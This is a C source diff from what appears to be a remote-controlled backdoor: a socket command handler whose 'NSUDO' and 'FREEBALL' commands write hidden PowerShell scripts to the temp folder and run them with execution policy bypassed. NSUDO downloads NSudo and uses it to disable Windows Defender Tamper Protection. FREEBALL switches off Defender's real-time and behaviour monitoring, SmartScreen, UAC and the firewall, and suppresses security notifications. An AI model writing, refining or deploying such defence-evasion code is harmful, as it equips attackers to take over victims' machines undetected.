@@ -198,38 +198,66 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         result = "[Security check complete]";
     }
     else if (strcmp(cmd, "NSUDO") == 0) {
-        const char *ps = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \""
-            "$zip = Join-Path $env:TEMP 'NSudo.zip'; "
-            "$out = Join-Path $env:TEMP 'NSudo'; "
-            "Invoke-WebRequest -Uri 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All.zip' -OutFile $zip; "
-            "Expand-Archive -Path $zip -DestinationPath $out -Force; "
-            "$exe = Join-Path $out 'x64\\NSudo.exe'; "
-            "if (Test-Path $exe) { "
-            "Start-Process -FilePath $exe -ArgumentList '-U:T','-ShowWindowMode:Hide','reg','add','HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features','/v','TamperProtection','/t','REG_DWORD','/d','4','/f' -WindowStyle Hidden -Wait; "
-            "Write-Host 'Tamper Protection disabled'; "
-            "} else { Write-Host 'NSudo.exe not found after extraction'; }\"";
-        result = sys_run_command(ps);
+        char tempPath[MAX_PATH];
+        GetTempPathA(MAX_PATH, tempPath);
+        char psPath[MAX_PATH];
+        snprintf(psPath, sizeof(psPath), "%s\\nsudo_run.ps1", tempPath);
+        
+        FILE *f = fopen(psPath, "w");
+        if (f) {
+            fprintf(f, "$zip = Join-Path $env:TEMP 'NSudo.zip'\n");
+            fprintf(f, "$out = Join-Path $env:TEMP 'NSudo'\n");
+            fprintf(f, "Invoke-WebRequest -Uri 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All.zip' -OutFile $zip\n");
+            fprintf(f, "Expand-Archive -Path $zip -DestinationPath $out -Force\n");
+            fprintf(f, "$exe = Join-Path $out 'x64\\NSudo.exe'\n");
+            fprintf(f, "if (Test-Path $exe) {\n");
+            fprintf(f, "    Start-Process -FilePath $exe -ArgumentList '-U:T','-ShowWindowMode:Hide','reg','add','HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features','/v','TamperProtection','/t','REG_DWORD','/d','4','/f' -WindowStyle Hidden -Wait\n");
+            fprintf(f, "    Write-Host 'Tamper Protection disabled'\n");
+            fprintf(f, "} else {\n");
+            fprintf(f, "    Write-Host 'NSudo.exe not found after extraction'\n");
+            fprintf(f, "}\n");
+            fclose(f);
+            
+            char runCmd[MAX_PATH + 128];
+            snprintf(runCmd, sizeof(runCmd), "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%s\"", psPath);
+            result = sys_run_command(runCmd);
+        } else {
+            result = "[Failed to write temp PowerShell script]";
+        }
     }
     else if (strcmp(cmd, "FREEBALL") == 0) {
-        const char *ps = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \""
-            "Set-MpPreference -DisableRealtimeMonitoring $true; "
-            "Set-MpPreference -DisableBehaviorMonitoring $true; "
-            "Set-MpPreference -DisableIOAVProtection $true; "
-            "Set-MpPreference -DisableBlockAtFirstSeen $true; "
-            "Set-MpPreference -DisablePrivacyMode $true; "
-            "Set-MpPreference -DisableScanOnRealtimeEnable $true; "
-            "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f; "
-            "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f; "
-            "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f; "
-            "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' /v DisableOnAccessProtection /t REG_DWORD /d 1 /f; "
-            "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f; "
-            "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' /v EnableSmartScreen /t REG_DWORD /d 0 /f; "
-            "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer' /v SmartScreenEnabled /t REG_SZ /d Off /f; "
-            "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' /v EnableLUA /t REG_DWORD /d 0 /f; "
-            "netsh advfirewall set allprofiles state off; "
-            "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration' /v Notification_Suppress /t REG_DWORD /d 1 /f; "
-            "Write-Host 'All done. Restart your computer now.' -ForegroundColor Green\"";
-        result = sys_run_command(ps);
+        char tempPath[MAX_PATH];
+        GetTempPathA(MAX_PATH, tempPath);
+        char psPath[MAX_PATH];
+        snprintf(psPath, sizeof(psPath), "%s\\freeball_run.ps1", tempPath);
+        
+        FILE *f = fopen(psPath, "w");
+        if (f) {
+            fprintf(f, "Set-MpPreference -DisableRealtimeMonitoring $true\n");
+            fprintf(f, "Set-MpPreference -DisableBehaviorMonitoring $true\n");
+            fprintf(f, "Set-MpPreference -DisableIOAVProtection $true\n");
+            fprintf(f, "Set-MpPreference -DisableBlockAtFirstSeen $true\n");
+            fprintf(f, "Set-MpPreference -DisablePrivacyMode $true\n");
+            fprintf(f, "Set-MpPreference -DisableScanOnRealtimeEnable $true\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' /v DisableAntiSpyware /t REG_DWORD /d 1 /f\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' /v DisableOnAccessProtection /t REG_DWORD /d 1 /f\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection' /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' /v EnableSmartScreen /t REG_DWORD /d 0 /f\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer' /v SmartScreenEnabled /t REG_SZ /d Off /f\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' /v EnableLUA /t REG_DWORD /d 0 /f\n");
+            fprintf(f, "netsh advfirewall set allprofiles state off\n");
+            fprintf(f, "reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration' /v Notification_Suppress /t REG_DWORD /d 1 /f\n");
+            fprintf(f, "Write-Host 'All done. Restart your computer now.' -ForegroundColor Green\n");
+            fclose(f);
+            
+            char runCmd[MAX_PATH + 128];
+            snprintf(runCmd, sizeof(runCmd), "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%s\"", psPath);
+            result = sys_run_command(runCmd);
+        } else {
+            result = "[Failed to write temp PowerShell script]";
+        }
     }
     else if (strcmp(cmd, "PROTECT_PROCESS") == 0 || strcmp(cmd, "DEPLOY_SVC") == 0) {
         sys_spawn_shadow_copy();
